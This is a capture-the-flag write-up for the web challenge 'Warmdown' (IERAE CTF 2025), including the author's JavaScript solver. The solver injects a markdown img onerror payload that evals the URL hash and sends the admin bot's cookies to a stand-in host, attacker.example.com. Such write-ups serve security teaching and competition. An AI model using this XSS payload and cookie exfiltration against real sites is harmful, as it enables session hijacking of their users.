---
title: "Warmdown - IERAE CTF 2025"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "eval", "warmdown", "web", "ierae-ctf-2025"]
summary: "Warmdown = Warmup + Markdown"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202506_IERAE_CTF_2025/web/warmdown"
license: "none stated"
ctf:
  name: "IERAE CTF 2025"
  year: 2025
  challenge: "Warmdown"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202506_IERAE_CTF_2025/web/warmdown>
- **CTF:** IERAE CTF 2025

---

# [web] Warmdown

## Description

Warmdown = Warmup + Markdown

- Challenge: `http://{web.host}:{web.port}`
- Admin bot: `http://{bot.host}:{bot.port}`

## Attachments

- [warmdown](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202506_IERAE_CTF_2025/web/warmdown/solution/index.js>

```javascript
import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const url = new URL("http://web:3000");
url.searchParams.set(
  "markdown",
  "&lt;img src onerror=eval(decodeURIComponent(location.hash.slice(1)))&gt;"
);
url.hash = `location = "${CONNECTBACK_URL}?" + document.cookie`;

app.get("/", async (req, reply) => {
  // You got a flag!
  console.log(req.query);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3_000);
  await reportUrl(url);

  await sleep(3_000);
  assert.fail("Failed");
});
```
